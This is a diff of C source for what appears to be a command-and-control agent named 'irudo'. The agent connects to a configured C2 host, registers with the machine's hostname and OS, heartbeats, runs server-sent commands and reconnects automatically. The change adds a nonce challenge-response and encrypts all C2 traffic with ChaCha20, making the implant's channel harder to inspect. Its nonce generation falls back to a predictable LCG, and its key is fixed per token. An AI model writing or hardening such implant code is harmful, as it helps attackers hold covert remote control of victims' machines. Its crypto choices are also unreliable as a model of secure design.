@@ -211,16 +211,98 @@ static sockfd_t tcp_connect(const char *host, int port) {
     return sock;
 }
 
-static int send_register(sockfd_t sock, const opts *o, uint64_t req_id) {
+/* Generate a 32-char hex nonce (16 random-ish bytes). */
+static void gen_nonce(char *out, size_t outsz) {
+    unsigned char buf[16];
+    int i;
+#ifdef _WIN32
+    uint64_t seed = ((uint64_t)time(NULL) << 32) ^ (uint64_t)GetTickCount64();
+    for (i = 0; i < 16; i++) {
+        seed = seed * 6364136223846793005ULL + 1442695040888963407ULL;
+        buf[i] = (unsigned char)(seed >> 33);
+    }
+#else
+    int filled = 0;
+    FILE *f = fopen("/dev/urandom", "rb");
+    if (f) {
+        if (fread(buf, 1, sizeof buf, f) == sizeof buf) filled = 1;
+        fclose(f);
+    }
+    if (!filled) {
+        uint64_t seed = ((uint64_t)time(NULL) << 32)
+                      ^ ((uint64_t)getpid() << 16) ^ (uint64_t)rand();
+        for (i = 0; i < 16; i++) {
+            seed = seed * 6364136223846793005ULL + 1442695040888963407ULL;
+            buf[i] = (unsigned char)(seed >> 33);
+        }
+    }
+#endif
+    static const char hexc[] = "0123456789abcdef";
+    for (i = 0; i < 16 && i * 2 + 1 < (int)outsz; i++) {
+        out[i * 2] = hexc[buf[i] >> 4];
+        out[i * 2 + 1] = hexc[buf[i] & 0xf];
+    }
+    out[outsz - 1] = 0;
+}
+
+/* Challenge-response registration handshake.
+ * 1. Send register carrying a random nonce (no plaintext token).
+ * 2. Receive register_response = sha256(nonce + c2_auth_tokens).
+ * 3. Verify the hash locally; on mismatch return -1 (disconnect).
+ * 4. On success send register_confirm. Returns 0 on success, -1 on failure. */
+static int auth_handshake(sockfd_t sock, const opts *o, bytebuf_t *inbuf) {
+    char nonce[40];
+    gen_nonce(nonce, sizeof nonce);
+
     char hostbuf[256];
     if (get_hostname(hostbuf, sizeof hostbuf) != 0) strcpy(hostbuf, "unknown");
     char *os = detect_os();
-    const char *params[4] = { o->agent_id, o->auth_token, hostbuf, os };
+    const char *params[4] = { o->agent_id, nonce, hostbuf, os };
     uint32_t plen = 0;
-    uint8_t *pkt = build_request(req_id, CMD_REGISTER, params, 4, &plen);
+    uint8_t *pkt = build_request(1, CMD_REGISTER, params, 4, &plen);
     int rc = pkt ? send_all(sock, pkt, plen) : -1;
     free(pkt);
     free(os);
+    if (rc != 0) return -1;
+
+    uint64_t req_id;
+    uint8_t cmd;
+    const uint8_t *body;
+    uint32_t blen;
+    if (take_packet_blocking(sock, inbuf, &req_id, &cmd, &body, &blen, 15000) <= 0) {
+        fprintf(stderr, "[irudo] no register_response from C2\n");
+        return -1;
+    }
+    if (cmd != CMD_REGISTER_RESPONSE) {
+        fprintf(stderr, "[irudo] expected register_response, got cmd=%#x\n", cmd);
+        return -1;
+    }
+
+    char expected[65];
+    size_t bl = blen < 64 ? blen : 64;
+    memcpy(expected, body, bl);
+    expected[bl] = 0;
+
+    size_t nlen = strlen(nonce), tlen = strlen(o->auth_token);
+    char *joined = (char *)malloc(nlen + tlen + 1);
+    if (!joined) return -1;
+    memcpy(joined, nonce, nlen);
+    memcpy(joined + nlen, o->auth_token, tlen + 1);
+    char local[65];
+    sha256_hex(joined, nlen + tlen, local);
+    free(joined);
+
+    if (strcmp(local, expected) != 0) {
+        fprintf(stderr, "[irudo] auth verification failed (token mismatch)\n");
+        return -1;
+    }
+
+    const char *cparams[1] = { o->agent_id };
+    uint32_t plen2 = 0;
+    pkt = build_request(2, CMD_REGISTER_CONFIRM, cparams, 1, &plen2);
+    if (!pkt) return -1;
+    rc = send_all(sock, pkt, plen2);
+    free(pkt);
     return rc;
 }
 
@@ -414,10 +496,8 @@ static int dispatch(sockfd_t sock, bytebuf_t *inbuf, const opts *o, int *shutdow
 /* serve loop + reconnect                                                */
 /* ===================================================================== */
 
-static int serve(sockfd_t sock, const opts *o, int *shutdown_flag) {
-    bytebuf_t inbuf;
-    bb_init(&inbuf);
-    uint64_t next_req = 2; /* 1 used by register */
+static int serve(sockfd_t sock, const opts *o, bytebuf_t *inbuf, int *shutdown_flag) {
+    uint64_t next_req = 3; /* 1 = register, 2 = register_confirm */
     int64_t last_hb = now_ms();
     int ret = 0;
 
@@ -426,10 +506,10 @@ static int serve(sockfd_t sock, const opts *o, int *shutdown_flag) {
         uint8_t cmd;
         const uint8_t *body;
         uint32_t blen;
-        int have = bb_take_packet(&inbuf, &req_id, &cmd, &body, &blen);
+        int have = bb_take_packet(inbuf, &req_id, &cmd, &body, &blen);
         if (have < 0) { ret = -1; break; }
         if (have > 0) {
-            ret = dispatch(sock, &inbuf, o, shutdown_flag, req_id, cmd, body, blen);
+            ret = dispatch(sock, inbuf, o, shutdown_flag, req_id, cmd, body, blen);
             if (ret != 0) break;
             continue;
         }
@@ -443,7 +523,7 @@ static int serve(sockfd_t sock, const opts *o, int *shutdown_flag) {
         }
         int sel = wait_sock(sock, (int)wait_ms);
         if (sel > 0) {
-            int r = recv_more(sock, &inbuf);
+            int r = recv_more(sock, inbuf);
             if (r <= 0) { ret = -1; break; }
         } else if (sel == 0) {
             if (send_heartbeat_pkt(sock, next_req++) != 0) { ret = -1; break; }
@@ -453,7 +533,6 @@ static int serve(sockfd_t sock, const opts *o, int *shutdown_flag) {
             break;
         }
     }
-    bb_free(&inbuf);
     return ret;
 }
 
@@ -471,14 +550,25 @@ static int run(const opts *o) {
             continue;
         }
         fprintf(stderr, "[irudo] connected to %s:%d\n", o->c2_host, o->c2_port);
-        if (send_register(sock, o, 1) != 0) {
+        bytebuf_t inbuf;
+        bb_init(&inbuf);
+        if (auth_handshake(sock, o, &inbuf) != 0) {
+            bb_free(&inbuf);
             sock_close(sock);
-            fprintf(stderr, "[irudo] register send failed; retry in %.0fs\n", delay);
+            fprintf(stderr, "[irudo] registration handshake failed; retry in %.0fs\n", delay);
             sleep_sec(delay);
             if (delay * 2 <= (double)o->reconnect_max) delay *= 2;
             continue;
         }
-        int ret = serve(sock, o, &shutdown_flag);
+        /* Handshake + auth succeeded: switch the whole stream to ChaCha20
+         * encryption keyed by sha256(auth_token). */
+        {
+            uint8_t key[32];
+            sha256_digest((const uint8_t *)o->auth_token, strlen(o->auth_token), key);
+            crypto_enable_agent(key);
+        }
+        int ret = serve(sock, o, &inbuf, &shutdown_flag);
+        bb_free(&inbuf);
         sock_close(sock);
         if (shutdown_flag) {
             fprintf(stderr, "[irudo] shutdown received, exiting\n");
